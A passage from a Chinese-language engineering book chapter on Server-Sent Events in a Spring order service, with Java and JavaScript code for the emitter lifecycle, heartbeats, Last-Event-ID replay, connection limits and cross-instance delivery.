data: {"orderId":"ord_01k1","from":"PAID","to":"SHIPPED"}

id: evt_00044
event: order.shipment.updated
data: {"orderId":"ord_01k1","trackingNumber":"TW1234567890",
data: "carrier":"BLACK_CAT"}

: heartbeat 2026-08-24T03:16:00Z

id: evt_00045
event: order.status.changed
data: {"orderId":"ord_01k1","from":"SHIPPED","to":"DELIVERED"}

event: stream.end
data: {"reason":"ORDER_COMPLETED"}
```

**五種行的意義**：

| 前綴 | 意義 |
|---|---|
| `id:` | 事件 ID。瀏覽器記住最後一個，重連時放進 `Last-Event-ID` header |
| `event:` | 事件型別。前端用 `source.addEventListener('order.status.changed', …)` 監聽 |
| `data:` | 資料。**多行 `data:` 會被換行接起來**（上面 evt_00044 的例子） |
| `retry:` | 告訴瀏覽器「重連前等幾毫秒」（毫秒） |
| `:`（冒號開頭） | **註解，會被瀏覽器忽略** —— 這是心跳的標準做法 |
| **空行** | **事件的分隔符**。⚠️ 沒有空行事件就不會被送出 |

⚠️ **三個容易踩的格式細節**：

```
① data 裡的換行會被當成「多行 data」
   data: {"note":"第一行
   第二行"}                        ← 🔴 第二行沒有 data: 前綴 → 格式壞掉

   ✅ JSON 序列化會自動把換行轉成 \n，所以「一律送 JSON」就沒事。
   ⚠️ 但如果你直接送使用者輸入的字串（不經 JSON），就會壞。

② id 裡不能有換行
   攻擊者控制 event id → 注入假事件（SSE 版的 log injection，04 章 4.5.3）
   ✅ 所以 event id 一律由伺服器產生（我們用遞增序號）。

③ 空行必須真的是空的
   "  \n"（有空白）不算空行 → 事件不會被送出
   ✅ SseEmitter 幫你處理了，但如果你自己寫 OutputStream 就要小心。
```

**前端的用法**（`EventSource` 是瀏覽器內建的）：

```javascript
// ⚠️ EventSource 不能設 header —— 所以認證只能靠 cookie 或 URL 參數（5.11.9）
const source = new EventSource(`/orders/${orderId}/events`, {
  withCredentials: true                  // 帶 cookie
});

source.addEventListener('order.status.changed', (e) => {
  const data = JSON.parse(e.data);
  updateOrderStatus(data.to);
});

source.addEventListener('stream.end', (e) => {
  // ★ 伺服器主動結束（訂單已完成，不會再有事件）
  //   ⚠️ 一定要自己 close()，否則瀏覽器會自動重連！
  source.close();
});

source.onerror = (e) => {
  // ⚠️ 這個 handler 對「網路斷線」與「伺服器回 4xx」都會觸發，
  //    但兩者的正確處理完全不同：
  //      · readyState === CONNECTING → 瀏覽器正在自動重連，什麼都不用做
  //      · readyState === CLOSED     → 瀏覽器放棄了（通常是 4xx），要處理
  if (source.readyState === EventSource.CLOSED) {
    showReconnectButton();
  }
  // ★ 不要在這裡呼叫 source.close() —— 那會取消瀏覽器的自動重連
};
```

⚠️ **`onerror` 的行為是 SSE 最容易誤解的部分**：
瀏覽器**只要連線中斷就會自動重連**（間隔由 `retry:` 指定，預設約 3 秒）。
**除非**伺服器回了非 200 的狀態碼，或客戶端呼叫了 `close()`。

**這代表兩件事**：

| 好處 | 壞處 |
|---|---|
| ✅ 網路抖動、伺服器重啟、部署，前端全都自動恢復 —— **完全不用寫重連邏輯** | 🔴 「伺服器正常結束串流」也會被當成斷線而重連 → **無限迴圈** |

**所以「正常結束」要明確處理**（5.11.4 的 `stream.end` 事件）。

### 5.11.3 `SseEmitter` 的完整生命週期

```java
package example.shop.order.web;

import example.shop.common.web.CurrentActor;
import example.shop.order.domain.Actor;
import example.shop.order.service.OrderEventStreamService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import java.io.IOException;
import java.time.Duration;

/**
 * 訂單事件的 SSE 推播。
 *
 * <p>★ 這個 Controller 的每一行都在處理「長連線」帶來的問題：
 * <ul>
 *   <li>連線可能存在一小時 → 授權在建立時檢查，之後不會再檢查（見下面的警告）。</li>
 *   <li>連線會斷 → 要有 {@code Last-Event-ID} 的補送。</li>
 *   <li>連線會空閒 → 要有心跳。</li>
 *   <li>連線會洩漏 → 要有 registry 與清理。</li>
 * </ul>
 */
@RestController
@RequestMapping("/orders/{orderId}/events")
public class OrderEventStreamController {

    private static final Logger log =
            LoggerFactory.getLogger(OrderEventStreamController.class);

    /**
     * 連線的存活上限。
     *
     * <p>★ 為什麼不設無限：
     * <ul>
     *   <li>長連線會累積（客戶端關掉分頁不一定會通知伺服器）。</li>
     *   <li>部署時要等所有連線結束才能優雅關閉。</li>
     *   <li><b>授權是在連線建立時檢查的</b> —— 一條開 8 小時的連線
     *       意味著「使用者被停權 8 小時後還在收事件」。</li>
     * </ul>
     * 30 分鐘 + 瀏覽器自動重連 = 使用者無感，但每 30 分鐘重新檢查一次授權。
     */
    private static final Duration CONNECTION_TIMEOUT = Duration.ofMinutes(30);

    private final OrderEventStreamService streamService;

    public OrderEventStreamController(OrderEventStreamService streamService) {
        this.streamService = streamService;
    }

    @GetMapping(produces = MediaType.TEXT_EVENT_STREAM_VALUE)
    public SseEmitter stream(
            @PathVariable("orderId") String orderId,
            @RequestHeader(value = "Last-Event-ID", required = false) String lastEventId,
            @CurrentActor Actor actor) {

        // ── ① 授權（在建立 emitter 之前）★★ ──────────────────────
        // ⚠️ 這一步必須在建立 SseEmitter 之前 ——
        //    一旦回傳 emitter，回應就是 200 + text/event-stream，
        //    再拋例外也不能變成 403（5.11.9）。
        streamService.authorize(orderId, actor);

        // ── ② 建立 emitter ────────────────────────────────────────
        // ★ 建構子參數是逾時毫秒。
        //   0L = 永不逾時（⚠️ 不要用）；null = 用 spring.mvc.async.request-timeout
        SseEmitter emitter = new SseEmitter(CONNECTION_TIMEOUT.toMillis());

        // ── ③ 註冊回呼（★ 必須在送任何事件之前）────────────────────
        String subscriptionId = streamService.nextSubscriptionId();

        /*
         * onCompletion：連線正常結束時呼叫。
         *   觸發時機：
         *     · emitter.complete() 被呼叫
         *     · emitter.completeWithError() 被呼叫
         *     · 逾時（onTimeout 之後也會呼叫這個）
         *     · 客戶端斷線被偵測到
         *   ★ 它是「一定會被呼叫」的那一個 —— 清理程式碼放這裡。
         */
        emitter.onCompletion(() -> {
            // ⚠️ 這個回呼在「容器的執行緒」上執行，MDC 是空的（04 章 4.5.7 的最後一段）。
            //    所以要自己把 traceId 帶進來（用閉包）。
            streamService.unregister(subscriptionId);
            log.debug("SSE 連線結束 subscriptionId={} orderId={}", subscriptionId, orderId);
        });

        /*
         * onTimeout：逾時。
         *   ★ Spring 會在這之後自動呼叫 complete()，
         *     所以「不要在這裡再呼叫 complete()」（會拋 IllegalStateException）。
         *   ★ 但可以在這裡送一個「即將關閉」的事件 —— 不過通常來不及。
         */
        emitter.onTimeout(() -> {
            log.debug("SSE 連線逾時 subscriptionId={} orderId={}", subscriptionId, orderId);
            // ⚠️ 不要呼叫 emitter.complete() —— Spring 已經在做了
        });

        /*
         * onError：送事件時發生 IOException（通常是客戶端已斷線）。
         *   ⚠️ 這不代表「錯誤」—— 客戶端關掉分頁就會走到這裡。
         *      所以不要記 ERROR（03 章 3.12.2）。
         */
        emitter.onError(throwable -> {
            if (isClientDisconnect(throwable)) {
                log.debug("SSE 客戶端斷線 subscriptionId={}", subscriptionId);
            } else {
                log.warn("SSE 連線錯誤 subscriptionId={} type={}",
                         subscriptionId, throwable.getClass().getSimpleName());
            }
            // ★ onCompletion 也會被呼叫，所以清理不用在這裡重複做
        });

        // ── ④ 註冊到 registry（讓事件發布者找得到它）───────────────
        streamService.register(subscriptionId, orderId, actor.id(), emitter);

        // ── ⑤ 立刻送一個「已連線」的訊號 ★ ─────────────────────────
        try {
            // ★ 為什麼要立刻送東西：
            //   (a) 讓客戶端確認連線真的建立了（否則它不知道是連上了還是卡住）
            //   (b) 讓中間的代理「看到有資料」→ 有些代理要收到第一個 byte
            //       才會把回應標頭轉給客戶端
            //   (c) 送 retry: 告訴瀏覽器重連間隔
            emitter.send(SseEmitter.event()
                    .comment("connected subscription=" + subscriptionId)
                    .reconnectTime(3_000L));            // retry: 3000

            // ── ⑥ 補送遺漏的事件（斷線續傳）★ ─────────────────────
            if (lastEventId != null) {
                int replayed = streamService.replaySince(orderId, lastEventId, emitter);
                log.debug("SSE 補送事件 subscriptionId={} lastEventId={} replayed={}",
                          subscriptionId, lastEventId, replayed);
            }

            // ── ⑦ 送目前狀態（讓前端不用另外打一次 GET /orders/{id}）───
            streamService.sendCurrentSnapshot(orderId, emitter);

        } catch (IOException e) {
            // ★ 連第一個事件都送不出去 → 客戶端已經走了
            emitter.completeWithError(e);
        }

        return emitter;
    }

    private static boolean isClientDisconnect(Throwable t) {
        String type = t.getClass().getSimpleName();
        if (type.equals("AsyncRequestNotUsableException")
                || type.equals("ClientAbortException")) {
            return true;
        }
        String message = String.valueOf(t.getMessage()).toLowerCase();
        return message.contains("broken pipe")
                || message.contains("connection reset")
                || message.contains("connection was aborted");
    }
}
```

**三個回呼的完整觸發矩陣**：

| 情境 | `onError` | `onTimeout` | `onCompletion` |
|---|---|---|---|
| `complete()` 被呼叫 | ❌ | ❌ | ✅ |
| `completeWithError(e)` 被呼叫 | ✅ | ❌ | ✅ |
| 逾時 | ❌ | ✅ | ✅ |
| `send()` 拋 `IOException`（客戶端斷線） | ✅ | ❌ | ✅ |
| 應用程式被關閉 | ⚠️ 依容器 | ❌ | ⚠️ 依容器 |

⚠️ **「`onCompletion` 一定會被呼叫」是唯一可以依賴的保證** ——
所以清理（從 registry 移除）只寫在那裡，不要在三個地方各寫一次。

### 5.11.4 心跳：為什麼不能省

**空閒的 SSE 連線會被沿路的每一層回收**：

| 層 | 預設閒置逾時 |
|---|---|
| 瀏覽器 | 無（會一直等） |
| 企業防火牆 / NAT | 常見 60～300 秒 |
| AWS ALB | **60 秒** |
| Nginx（`proxy_read_timeout`） | **60 秒** |
| Cloudflare | 約 100 秒 |
| Kubernetes Service / kube-proxy | 依設定 |

**「訂單狀態改變」的頻率是幾小時一次** → 連線永遠是空閒的 → **永遠被回收**。

⚠️ **被回收的症狀很迷惑**：瀏覽器會自動重連，所以功能「看起來正常」。
但實際發生的是「每 60 秒建立一條新連線」——
每條都要跑一次授權查詢與 `Last-Event-ID` 補送。
**一個 1000 人在線的系統會有每秒 17 次的無意義重連。**

```java
package example.shop.order.service;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import java.io.IOException;
import java.time.Instant;

/**
 * SSE 的心跳。
 *
 * <p>★ 心跳用「註解行」（{@code : heartbeat}）而不是真的事件：
 * <ul>
 *   <li>註解會被瀏覽器完全忽略 → 前端不用處理它。</li>
 *   <li>它不會改變 {@code Last-Event-ID}（沒有 {@code id:}）→
 *       不影響斷線續傳的位置。</li>
 * </ul>
 *
 * <p>★ 心跳同時是「偵測死連線」的唯一手段：
 * TCP 的 socket 在客戶端「拔網路線」的情況下不會立刻報錯，
 * 只有嘗試寫入時才會發現。<b>心跳就是那個嘗試寫入。</b>
 * 沒有心跳的話，一條死連線會佔著 emitter 直到逾時（30 分鐘）。
 */
@Component
public class SseHeartbeat {

    private static final Logger log = LoggerFactory.getLogger(SseHeartbeat.class);

    private final SseEmitterRegistry registry;

    public SseHeartbeat(SseEmitterRegistry registry) {
        this.registry = registry;
    }

    /**
     * 每 20 秒一次。
     *
     * <p>★ 為什麼是 20 秒：必須小於「最短的中間層逾時」（60 秒）的三分之一，
     * 這樣即使掉了一次心跳也還在安全範圍。
     *
     * <p>⚠️ 不要設太短（例如 5 秒）：1000 條連線 × 每 5 秒 = 每秒 200 次寫入，
     * 而每次寫入都是一個 syscall。20 秒的話是每秒 50 次 —— 可忽略。
     */
    @Scheduled(fixedRate = 20_000L)
    public void beat() {
        String stamp = Instant.now().toString();
        int sent = 0;
        int dead = 0;

        for (var subscription : registry.all()) {
            try {
                subscription.emitter().send(SseEmitter.event()
                        .comment("heartbeat " + stamp));
                sent++;
            } catch (IOException | IllegalStateException e) {
                // ★ IOException      = 客戶端斷線
                //   IllegalStateException = emitter 已經 complete（競態：
                //                           另一條執行緒剛剛結束了它）
                //   兩者都代表「這條連線不能用了」
                dead++;
                // ⚠️ 不要在這裡直接 registry.remove() ——
                //    completeWithError 會觸發 onCompletion，而那裡已經有 remove。
                //    重複移除雖然無害，但「兩個地方都負責清理」是 bug 的溫床。
                safeCompleteWithError(subscription.emitter(), e);
            }
        }

        if (dead > 0) {
            log.debug("SSE 心跳 sent={} dead={} remaining={}", sent, dead, registry.size());
        }
    }

    private static void safeCompleteWithError(SseEmitter emitter, Throwable cause) {
        try {
            emitter.completeWithError(cause);
        } catch (Exception ignored) {
            // 已經 complete 了 —— 沒關係
        }
    }
}
```

⚠️ **`@Scheduled` 的執行緒池預設只有 1 條執行緒**。
如果有 5000 條連線，而其中一條的 `send()` 阻塞（客戶端的 TCP 接收窗滿了），
**整個心跳排程會卡住**，所有連線都收不到心跳。

```java
package example.shop.common.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.SchedulingConfigurer;
import org.springframework.scheduling.concurrent.ThreadPoolTaskScheduler;
import org.springframework.scheduling.config.ScheduledTaskRegistrar;

/**
 * 排程的執行緒池。
 *
 * <p>⚠️ Spring 的預設是<b>單一執行緒</b>的 scheduler。
 * 一個慢的排程任務會延遲所有其他任務 ——
 * 而 SSE 的心跳如果被延遲，全部的連線都會被中間層回收（5.11.4）。
 */
@Configuration
@EnableScheduling
public class SchedulingConfig implements SchedulingConfigurer {

    @Override
    public void configureTasks(ScheduledTaskRegistrar registrar) {
        registrar.setTaskScheduler(taskScheduler());
    }

    @Bean
    public ThreadPoolTaskScheduler taskScheduler() {
        var scheduler = new ThreadPoolTaskScheduler();
        scheduler.setPoolSize(4);
        scheduler.setThreadNamePrefix("scheduled-");
        // ★ 排程任務拋例外時不要讓執行緒死掉（預設行為是任務不再被排程）
        scheduler.setErrorHandler(t ->
                org.slf4j.LoggerFactory.getLogger(SchedulingConfig.class)
                        .error("排程任務拋出例外", t));
        scheduler.setWaitForTasksToCompleteOnShutdown(true);
        scheduler.setAwaitTerminationSeconds(20);
        scheduler.initialize();
        return scheduler;
    }
}
```

⚠️ **`setErrorHandler` 這一行很重要**：Spring 的 `@Scheduled` 任務如果拋出例外，
`ScheduledExecutorService` 會**停止排程那個任務**（不是只跳過這一次）。
症狀是「心跳跑了幾小時後就完全不動了」，而且**沒有任何錯誤日誌**。

### 5.11.5 `Last-Event-ID` 與斷線續傳

**問題**：連線斷了 3 秒，這 3 秒內訂單從 `SHIPPED` 變成 `DELIVERED`。
重連後怎麼知道漏了什麼？

```java
package example.shop.order.service;

import example.shop.order.domain.OrderEvent;
import org.springframework.stereotype.Service;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import java.io.IOException;
import java.util.List;

/**
 * 事件的補送。
 *
 * <p>★ 這需要「事件被持久化」—— 這是 SSE 相對 WebSocket 沒有優勢的地方：
 * 兩者都需要一個事件儲存。
 *
 * <p>shop-service 的做法：訂單的每次狀態變更都寫一筆
 * {@code order_event}（這本來就需要，因為 {@code GET /orders/{id}/status-changes}
 * 端點要用它 —— 03-rest-api 1.14.3）。SSE 只是「同一份資料的另一種傳遞方式」。
 *
 * <p>⚠️ 這是一個很重要的設計原則：<b>SSE 不該是事件的唯一來源</b>。
 * 如果事件只存在於「推播的那一瞬間」，那任何斷線都會造成資料遺失，
 * 而且無法測試、無法重播、無法除錯。
 */
@Service
public class OrderEventReplayService {

    /** 一次最多補送幾筆（防止斷線很久後補送幾千筆）。 */
    private static final int MAX_REPLAY = 100;

    private final OrderEventRepository eventRepository;

    public OrderEventReplayService(OrderEventRepository eventRepository) {
        this.eventRepository = eventRepository;
    }

    /**
     * 補送 {@code lastEventId} 之後的事件。
     *
     * @return 實際補送的筆數
     */
    public int replaySince(String orderId, String lastEventId, SseEmitter emitter)
            throws IOException {

        // ── 驗證 lastEventId ★ ────────────────────────────────────
        // ⚠️ 它來自客戶端的 header —— 完全不可信。
        //    我們的 ID 格式是 "evt_" + 12 位數字（見 nextEventId）
        long sequence = parseSequence(lastEventId);
        if (sequence < 0) {
            // 格式不對 → 當作沒有（送全部近期事件），不要報錯
            // ★ 理由：一個壞掉的 Last-Event-ID 不該讓使用者完全連不上
            sequence = 0;
        }

        List<OrderEvent> missed =
                eventRepository.findByOrderIdAfterSequence(orderId, sequence, MAX_REPLAY + 1);

        boolean truncated = missed.size() > MAX_REPLAY;
        if (truncated) {
            missed = missed.subList(0, MAX_REPLAY);
        }

        for (OrderEvent event : missed) {
            emitter.send(SseEmitter.event()
                    .id(formatEventId(event.sequence()))
                    .name(event.type())
                    .data(event.payload()));       // 已經是 JSON 安全的物件
        }

        if (truncated) {
            // ★ 明確告訴客戶端「你漏太多了，請重新載入整頁」——
            //   靜默地只補送前 100 筆會讓前端的狀態不一致
            emitter.send(SseEmitter.event()
                    .name("stream.resync-required")
                    .data(java.util.Map.of(
                            "reason", "TOO_MANY_MISSED_EVENTS",
                            "replayedCount", MAX_REPLAY,
                            "hint", "請重新載入頁面以取得完整狀態")));
        }

        return missed.size();
    }

    /**
     * 事件 ID 的格式：{@code evt_} + 12 位零填充的序號。
     *
     * <p>★ 三個設計決定：
     * <ol>
     *   <li><b>序號而不是 UUID</b> —— 補送需要「之後的所有事件」，
     *       那需要一個可比較的順序。UUID 做不到。</li>
     *   <li><b>零填充</b> —— 讓字典順序等於數值順序（方便除錯與日誌排序）。</li>
     *   <li><b>純英數字</b> —— SSE 的 {@code id:} 行不能有換行（5.11.2 的注入問題）。
     *       這個格式在結構上就不可能有問題。</li>
     * </ol>
     *
     * <p>⚠️ 序號是「每個訂單各自遞增」而不是全域遞增 ——
     * 全域遞增在多實例寫入下需要一個中央序號產生器（瓶頸）。
     */
    public static String formatEventId(long sequence) {
        return "evt_%012d".formatted(sequence);
    }

    /** @return 序號，或 {@code -1}（格式無效） */
    static long parseSequence(String eventId) {
        if (eventId == null || eventId.length() != 16 || !eventId.startsWith("evt_")) {
            return -1;
        }
        try {
            return Long.parseLong(eventId.substring(4));
        } catch (NumberFormatException e) {
            return -1;
        }
    }
}
```

⚠️ **`Last-Event-ID` 的一個實務陷阱**：
瀏覽器只在**自動重連**時送這個 header。如果使用者按 F5 重新載入頁面，
`EventSource` 是新建的，**不會有 `Last-Event-ID`**。

**所以前端不能只靠 SSE 維護狀態**：

```javascript
// ✅ 正確的前端流程
async function subscribeToOrder(orderId) {
  // ① 先用一般的 GET 取得完整狀態（權威來源）
  const order = await fetch(`/orders/${orderId}`).then(r => r.json());
  renderOrder(order);

  // ② 再開 SSE 接收增量更新
  const source = new EventSource(`/orders/${orderId}/events`);
  source.addEventListener('order.status.changed', (e) => {
    applyStatusChange(JSON.parse(e.data));
  });
  source.addEventListener('stream.resync-required', async () => {
    // ★ 伺服器說「你漏太多了」→ 重新取一次完整狀態
    const fresh = await fetch(`/orders/${orderId}`).then(r => r.json());
    renderOrder(fresh);
  });
  return source;
}
```

**「快照 + 增量」是所有即時推播的正確架構** ——
SSE / WebSocket 都一樣。純增量的系統一定會發散。

### 5.11.6 `SseEmitterRegistry`：多實例的問題

```java
package example.shop.order.service;

import io.micrometer.core.instrument.Gauge;
import io.micrometer.core.instrument.MeterRegistry;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicLong;

/**
 * 本機的 SSE 訂閱登錄簿。
 *
 * <p>★ 為什麼需要一個 registry：
 * 事件的來源是「訂單狀態改變」，而那發生在 Service 層
 * （一個完全不知道 HTTP 存在的地方）。
 * registry 是「領域事件」與「HTTP 連線」之間的橋。
 *
 * <p>⚠️ 這個類別只知道<b>本機</b>的連線。多實例部署下必須搭配 5.11.6 的 pub/sub。
 */
@Component
public class SseEmitterRegistry {

    private static final Logger log = LoggerFactory.getLogger(SseEmitterRegistry.class);

    /**
     * 連線數上限 —— <b>從設定讀，不是寫死的常數</b>。
     *
     * <p>★ 為什麼必須有上限：每條連線佔用
     * (a) 一個 Tomcat 的 NIO connection（受 {@code server.tomcat.max-connections} 限制）
     * (b) 一個 {@code SseEmitter} 物件與其回呼（約 1 KB）
     * (c) 一個 async context
     *
     * <p>沒有上限的話，一個惡意客戶端開 10 萬條連線就能耗盡
     * {@code max-connections}（預設 8192）→ <b>正常請求完全無法進來</b>。
     *
     * <p>⚠️⚠️ <b>為什麼不是 {@code private static final int}</b>（這一節原本就是這樣寫的）：
     *
     * <p>5.12.2 的 {@code application.yml} 有
     * {@code api.sse.max-total-connections: 5000} 與
     * {@code max-connections-per-actor: 10} —— 而如果程式碼用的是寫死的常數，
     * <b>那兩行設定就是死的</b>。
     *
     * <p>症狀：改設定沒反應、而且 07 章 7.11.4 的
     * 「超過連線上限回 503」測試沒辦法用
     * {@code @SpringBootTest(properties = "api.sse.max-total-connections=3")}
     * 把上限調低 —— 於是那個測試必須真的開 5,000 條連線（不可行）。
     *
     * <p>★ <b>一般規則：任何「運維可能想調」的數字都必須是設定，不是常數。</b>
     * 而「怎麼知道運維想調？」——<b>如果它出現在 application.yml 裡，答案就是「想」。</b>
     */
    private final int maxTotal;

    /** 每個 actor 的連線上限（防單一使用者耗盡配額）。 */
    private final int maxPerActor;

    /** orderId → 該訂單的所有訂閱。 */
    private final Map<String, List<Subscription>> byOrder = new ConcurrentHashMap<>();

    /** subscriptionId → 訂閱（用於 O(1) 移除）。 */
    private final Map<String, Subscription> bySubscription = new ConcurrentHashMap<>();

    /** actorId → 連線數。 */
    private final Map<String, java.util.concurrent.atomic.AtomicInteger> byActor =
            new ConcurrentHashMap<>();

    private final AtomicLong subscriptionCounter = new AtomicLong();

    public SseEmitterRegistry(MeterRegistry meterRegistry, SseProperties properties) {
        this.maxTotal = properties.maxTotalConnections();
        this.maxPerActor = properties.maxConnectionsPerActor();

        // ★ 把連線數做成指標 —— 這是唯一能看出「連線洩漏」的方式
        Gauge.builder("shop.sse.connections", this, SseEmitterRegistry::size)
                .description("目前的 SSE 連線數")
                .register(meterRegistry);
        // ★ 上限也做成指標 —— 沒有它的話，看到「4,900 條連線」不知道那是不是快滿了
        Gauge.builder("shop.sse.connections.max", this, r -> r.maxTotal)
                .description("SSE 連線數上限")
                .register(meterRegistry);
    }

    public String nextSubscriptionId() {
        return "sub_%d_%d".formatted(System.currentTimeMillis(),
                                     subscriptionCounter.incrementAndGet());
    }

    /**
     * 註冊一條連線。
     *
     * @throws TooManySseConnectionsException 超過上限
     */
    public void register(String subscriptionId, String orderId, String actorId,
                         SseEmitter emitter) {

        if (bySubscription.size() >= maxTotal) {
            // ★ 回 503 + Retry-After，而不是靜默拒絕
            throw new TooManySseConnectionsException(maxTotal, "server");
        }

        var actorCount = byActor.computeIfAbsent(actorId,
                k -> new java.util.concurrent.atomic.AtomicInteger());
        if (actorCount.incrementAndGet() > maxPerActor) {
            actorCount.decrementAndGet();
            throw new TooManySseConnectionsException(maxPerActor, "actor");
        }

        var subscription = new Subscription(subscriptionId, orderId, actorId, emitter);
        bySubscription.put(subscriptionId, subscription);
        // ★ CopyOnWriteArrayList：讀多寫少（心跳與事件廣播都是讀），
        //   而且走訪時不會有 ConcurrentModificationException
        byOrder.computeIfAbsent(orderId, k -> new CopyOnWriteArrayList<>())
               .add(subscription);
    }

    /**
     * 移除一條連線。
     *
     * <p>★ 這個方法必須是<b>冪等</b>的：
     * {@code onCompletion} 與心跳的失敗處理可能都會呼叫它。
     */
    public void unregister(String subscriptionId) {
        Subscription removed = bySubscription.remove(subscriptionId);
        if (removed == null) return;                  // 已經移除過了

        List<Subscription> list = byOrder.get(removed.orderId());
        if (list != null) {
            list.remove(removed);
            // ⚠️ 空的 list 要移除，否則 byOrder 會無限成長
            //    （每個曾經被訂閱過的 orderId 都留一個空 list）
            //    ★ 這裡有一個競態：remove 與 computeIfAbsent 之間可能插入新訂閱。
            //      用 compute 讓檢查與移除是原子的。
            byOrder.compute(removed.orderId(),
                    (k, v) -> (v == null || v.isEmpty()) ? null : v);
        }
        var count = byActor.get(removed.actorId());
        if (count != null && count.decrementAndGet() <= 0) {
            byActor.remove(removed.actorId(), count);
        }
    }

    /** 某個訂單的所有訂閱（本機）。 */
    public List<Subscription> forOrder(String orderId) {
        return byOrder.getOrDefault(orderId, List.of());
    }

    public Collection<Subscription> all() {
        return bySubscription.values();
    }

    /** 本機的總連線數。 */
    public int size() {
        return bySubscription.size();
    }

    /**
     * <b>某一個 actor</b> 的本機連線數。
     *
     * <p>★★ 這個方法有兩個用途，而第二個是它真正被加進來的原因：
     *
     * <ol>
     *   <li><b>正式碼</b>：{@code register()} 的 {@code maxPerActor} 檢查
     *       （原本用 {@code byActor} 的 {@code AtomicInteger} 直接判斷，
     *       但外部也需要讀得到這個數字 —— 例如
     *       「你目前開了 3 條連線，上限 10」這種提示）。</li>
     *   <li><b>測試</b>：SSE 的整合測試不可以用 {@link #size()} 當基準線。 ★★
     *       <pre>
     *       int before = registry.size();          // 🔴 全域的
     *       …開一條連線…
     *       await().until(() -> registry.size() == before + 1);
     *       …斷線…
     *       await().until(() -> registry.size() == before);   // 🔴 別的測試類別的連線也在裡面
     *       </pre>
     *       07 章 7.13.2 讓<b>測試類別之間平行執行</b>，而 registry 是
     *       整個 context 共用的 singleton ——
     *       於是這個測試在「另一個 SSE 測試剛好同時開著連線」時會失敗。
     *       症狀是「本機從不失敗、CI 約 1/15 失敗」（07 章練習 4）。
     *
     *       <p>★ 改成 {@code countFor(唯一的 actorId)} 就完全不受干擾 ——
     *       每個測試用自己的 actorId，共用的有狀態元件就不需要重設。</li>
     * </ol>
     *
     * <p>⚠️ 它只算<b>本機</b>的連線。多實例部署下「這個使用者總共開了幾條」
     * 需要 5.11.6 的 pub/sub 或一個共用的計數器 ——
     * 而 shop-service 刻意<b>不</b>做那件事：per-actor 的上限只是「防單一使用者
     * 耗盡單一 pod 的配額」，不需要全域精確。
     */
    public int countFor(String actorId) {
        var count = byActor.get(actorId);
        return (count == null) ? 0 : Math.max(0, count.get());
    }

    /**
     * 優雅關閉：通知所有客戶端「我要重啟了」。
     *
     * <p>★ 為什麼要做：不做的話部署時所有連線會硬斷，
     * 瀏覽器立刻同時重連 → <b>新 pod 剛起來就被 5000 條連線打爆</b>。
     *
     * <p>送一個帶隨機 {@code retry} 的事件，讓重連時間分散（jitter）。
     */
    @jakarta.annotation.PreDestroy
    public void shutdown() {
        log.info("關閉所有 SSE 連線 count={}", bySubscription.size());
        var random = new java.util.Random();
        for (var subscription : List.copyOf(bySubscription.values())) {
            try {
                // ★ 1～15 秒的隨機重連間隔 —— 讓 5000 條連線分散在 15 秒內回來
                subscription.emitter().send(SseEmitter.event()
                        .name("stream.reconnect")
                        .reconnectTime(1_000L + random.nextInt(14_000))
                        .data(Map.of("reason", "SERVER_SHUTDOWN")));
                subscription.emitter().complete();
            } catch (Exception ignored) {
                // 已斷線 —— 沒關係
            }
        }
        bySubscription.clear();
        byOrder.clear();
        byActor.clear();
    }

    public record Subscription(String subscriptionId, String orderId,
                               String actorId, SseEmitter emitter) {}
}
```

```java
package example.shop.order.service;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * SSE 連線數超過上限。
 *
 * <p>★ 回 503 + Retry-After（而不是 429）：
 * 這是「伺服器容量」問題而不是「你請求太快」。
 * ⚠️ 但如果是 {@code scope == "actor"}，429 也說得通 ——
 * shop-service 統一用 503 是為了讓前端只有一套處理邏輯
 * （SSE 的錯誤處理在瀏覽器裡本來就很受限）。
 */
public class TooManySseConnectionsException extends BusinessException {
    public TooManySseConnectionsException(int limit, String scope) {
        super(ErrorCode.SERVICE_UNAVAILABLE,
              "SSE connection limit reached (%s scope, limit %d).".formatted(scope, limit),
              null,
              Map.of("limit", limit, "scope", scope, "retryAfterSeconds", 30,
                     // ⚠️ 這裡曾經寫成 "scope".equals(scope) —— 那是拿【變數名】
                     //    去比對，而 scope 的值只會是 "server" 或 "actor"，
                     //    所以永遠是 false，per-actor 的提示永遠不會出現。
                     //    ★ 而它完全沒有症狀（總是顯示「伺服器已滿」，看起來很合理），
                     //      使用者被誤導去等，而正確的動作是「關掉其他分頁」。
                     "hint", "actor".equals(scope)
                             ? "同一個帳號的即時連線數已達上限，請關閉其他分頁。"
                             : "伺服器的即時連線已滿，請稍後再試。"),
              new Object[0],
              List.of());
    }
}
```

**多實例的問題** ★

```
使用者的瀏覽器 ──── LB ────▶ pod-A     ← SSE 連線在這裡
                              pod-B
                              pod-C

客服在後台把訂單改成「已出貨」的請求，被 LB 送到 pod-C
  → pod-C 的 SseEmitterRegistry 裡沒有這條連線
  → 🔴 事件永遠送不出去，使用者的畫面不會動
```

**機率**：3 個 pod → **只有 1/3 的機率剛好在同一個 pod**。

```java
package example.shop.order.service;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.data.redis.connection.MessageListener;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

/**
 * 用 Redis pub/sub 讓事件跨實例送達。
 *
 * <pre>
 *   pod-C 上的狀態變更
 *     → 寫入 order_event 表（權威來源，同一個交易）
 *     → 交易提交後（AFTER_COMMIT）發布到 Redis channel
 *     → 所有 pod 都收到
 *     → 每個 pod 檢查自己的 registry 有沒有這個 orderId 的訂閱
